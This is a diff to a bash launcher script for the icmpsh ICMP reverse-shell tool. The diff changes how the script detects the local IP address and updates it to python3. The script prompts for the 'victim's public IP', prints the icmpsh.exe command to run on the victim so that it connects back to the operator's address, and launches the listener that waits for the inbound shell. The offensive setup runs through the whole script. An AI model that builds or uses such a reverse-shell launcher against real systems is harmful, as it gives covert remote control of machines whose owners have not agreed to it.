@@ -13,8 +13,16 @@ echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 
 echo ""
-IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
+IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+
+if [ -z "$IP" ]; then
+    IP=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')
+fi
+
+if [ -z "$IP" ]; then
+    echo -e "\e[01;31m[!]\e[00m Could not determine local IPv4 address automatically."
+    exit 1
+fi
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
 echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
@@ -24,7 +32,7 @@ echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the 
 echo ""
 echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 echo ""
-echo "icmpsh.exe -t "$IP" -d 500 -b 30 -s 128"
+echo "icmpsh.exe -t $IP -d 500 -b 30 -s 128"
 echo ""
 echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 echo ""
@@ -41,7 +49,7 @@ fi
 echo ""
 echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
 echo ""
-python icmpsh_m.py "$IP" "$VICTIM"
+python3 icmpsh_m.py "$IP" "$VICTIM"
 if [ "$ICMPDIS" = "disabled" ]
                 then
                                 echo ""
